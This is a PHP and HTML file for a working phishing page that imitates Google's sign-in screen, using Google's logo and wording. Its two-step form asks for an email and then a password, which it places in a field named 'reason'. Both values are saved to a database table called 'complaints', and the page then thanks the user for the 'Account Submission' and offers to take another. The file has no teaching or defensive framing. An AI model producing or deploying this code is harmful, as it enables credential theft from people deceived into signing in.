<?php
require 'db.php';
$message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $reason = $_POST['reason'];

    $stmt = $conn->prepare("INSERT INTO complaints (username, reason) VALUES (?, ?)");
    $stmt->bind_param("ss", $username, $reason);

    if ($stmt->execute()) {
        $message = "<div class='alert'>Thank you for your Account Submission!</div>";
    }
    $stmt->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign in</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="card-container">
        
<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="brand-logo">

        <?php if ($message != ""): ?>
            <?= $message ?>
            <button type="button" class="btn-primary" onclick="window.location.href='index.php'" style="width: 100%; margin-top: 20px;">Submit Another Account?</button>
        <?php else: ?>
        
        <form method="POST" action="" id="complaintForm">
            <div class="slider-viewport">
                <div class="slider-track" id="slider-track">
                    
                    <div class="slide-panel">
                        <h1>Sign in</h1>    
                        <p class="subtitle">Use your Google Account</p>

                        <div class="floating-group">
                        <input type="email" id="username" name="username" placeholder=" " required>                            
                        <label for="username">Email or Phone</label>
                        </div>

                        <p class="info-paragraph">
                            Not your computer? Use Guest mode to sign in privately.<br>
                            <a href="#">Learn more about using Guest mode</a>
                        </p>

                        <div class="action-row" style="justify-content: flex-end;">
                            <button type="button" class="btn-primary" onclick="slideToComplaint()">Next</button>
                        </div>
                    </div>

                    <div class="slide-panel">
                        <h1>Welcome</h1>
                        
                        <div class="user-chip" onclick="slideBack()">
                            <svg focusable="false" width="20" height="20" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"></path></svg>
                            <span id="display-id">ID Placeholder</span>
                            <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"></path></svg>
                        </div>

                        <div class="floating-group">
                        <textarea id="reason" name="reason" rows="1" placeholder=" " required></textarea>                            
                        <label for="reason">Enter your Password</label>
                        </div>

                        <div class="action-row">
                            <button type="button" class="btn-secondary" onclick="slideBack()">Back</button>
                            <button type="submit" class="btn-primary">Next</button>
                        </div>
                    </div>

                </div>
            </div>
        </form>
        
        <?php endif; ?>

    </div>

    <script>
        function slideToComplaint() {
            const usernameInput = document.getElementById('username');
            const track = document.getElementById('slider-track');
            const displayId = document.getElementById('display-id');
            const reasonInput = document.getElementById('reason');
            
            if (!usernameInput.checkValidity()) {
                usernameInput.reportValidity();
                return;
            }

            displayId.innerText = usernameInput.value;
            track.style.transform = 'translateX(-50%)';
            
            setTimeout(() => { reasonInput.focus(); }, 400);
        }

        function slideBack() {
            const track = document.getElementById('slider-track');
            const usernameInput = document.getElementById('username');
            
            track.style.transform = 'translateX(0)';
            
            setTimeout(() => { usernameInput.focus(); }, 400);
        }

        document.getElementById('username').addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                slideToComplaint();
            }
        });
    </script>
</body>
</html>